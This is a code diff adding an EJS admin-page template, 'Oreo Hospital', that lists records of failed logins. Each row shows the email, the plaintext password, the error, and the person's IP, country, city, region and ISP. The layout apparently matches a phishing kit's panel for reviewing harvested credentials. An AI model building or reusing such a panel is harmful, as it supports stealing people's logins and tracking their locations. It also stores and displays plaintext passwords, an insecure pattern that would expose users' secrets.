@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>:: Oreo Hospital ::</title>
+
+    <!-- Meta -->
+    <meta name="description" content="Marketplace for Bootstrap Admin Dashboards" />
+    <meta name="author" content="Bootstrap Gallery" />
+    <link rel="canonical" href="https://www.bootstrap.gallery/">
+    <meta property="og:url" content="https://www.bootstrap.gallery">
+    <meta property="og:title" content="Admin Templates - Dashboard Templates | Bootstrap Gallery">
+    <meta property="og:description" content="Marketplace for Bootstrap Admin Dashboards">
+    <meta property="og:type" content="Website">
+    <meta property="og:site_name" content="Bootstrap Gallery">
+    <link rel="shortcut icon" href="assets2/images/favicon.svg" />
+
+    <link rel="stylesheet" href="assets2/fonts/icomoon/style.css" />
+
+    <link rel="stylesheet" href="assets2/css/main.min.css" />
+
+    <link rel="stylesheet" href="assets2/vendor/overlay-scroll/OverlayScrollbars.min.css" />
+  </head>
+
+  <style>
+    .truncate {
+    max-width: 150px; /* Adjust as needed */
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+  }
+  .truncate:hover {
+    white-space: normal;
+    overflow: visible;
+  }
+  </style>
+
+  <body>
+    <div class="page-wrapper">
+      <div class="app-container">
+        <div class="app-body">
+          <div class="container">
+
+            <!-- Row start -->
+            <div class="row gx-3">
+              <div class="col-12">
+                <div class="card mb-3">
+                  <div class="card-body">
+                    <div class="table-outer">
+                      <div class="table-responsive">
+                        <table class="table table-striped align-middle m-0">
+                          <thead>
+                            <tr>
+                              <th>ID</th>
+                              <th>Email</th>
+                              <th>PASSWORD</th>
+                              <th>ERROR</th>
+                              <th>IP</th>
+                              <th>COUNTRY</th>
+                              <th>CITY</th>
+                              <th>REGION</th>
+                              <th>ISP</th>
+                              <th>DATE</th>
+                            </tr>
+                          </thead>
+                          <tbody>
+                            <% failData.forEach(function(failData) { %>
+                            <tr>
+                              <!-- <th>
+                                <input class="form-check-input" type="checkbox" value="option1" />
+                              </th> -->
+                              <td class="truncate"><%= failData._id%></td>
+                              <td class="truncate"><%= failData.user_email%></td>
+                              <td class="truncate"><%= failData.user_password%></td>
+                              <td class="truncate">
+                                <div class="d-flex align-items-center">
+                                  <i class="icon-circle1 me-2 text-danger fs-5"></i>
+                                  <%= failData.error%>
+                                </div>
+                              </td>
+                              <td class="truncate"><%= failData.ip%></td>
+                              <td class="truncate"><%= failData.country%></td>
+                              <td class="truncate"><%= failData.city%></td>
+                              <td class="truncate"><%= failData.region%></td>
+                              <td class="truncate"><%= failData.isp%></td>
+                              <td class="truncate"><%= failData.createdAt%></td>
+                              <td>
+                                <button class="btn btn-outline-primary btn-sm" data-bs-toggle="tooltip"
+                                  data-bs-placement="top" data-bs-custom-class="custom-tooltip-primary"
+                                  data-bs-title="Edit">
+                                  <i class="icon-check-circle"></i>
+                                </button>
+                                <button class="btn btn-outline-danger btn-sm" data-bs-toggle="tooltip"
+                                  data-bs-placement="top" data-bs-custom-class="custom-tooltip-danger"
+                                  data-bs-title="Delete">
+                                  <i class="icon-trash"></i>
+                                </button>
+                              </td>
+                            </tr>
+                        <% }); %>
+                          </tbody>
+                        </table>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <!-- Row end -->
+
+          </div>
+        </div>
+        <div class="app-footer">
+          <div class="container">
+            <span>© Oreo Hospital</span>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <script src="assets2/js/jquery.min.js"></script>
+    <script src="assets2/js/bootstrap.bundle.min.js"></script>
+
+    <script src="assets2/vendor/overlay-scroll/jquery.overlayScrollbars.min.js"></script>
+    <script src="assets2/vendor/overlay-scroll/custom-scrollbar.js"></script>
+
+    <script src="assets2/js/custom.js"></script>
+  </body>
+
+</html>
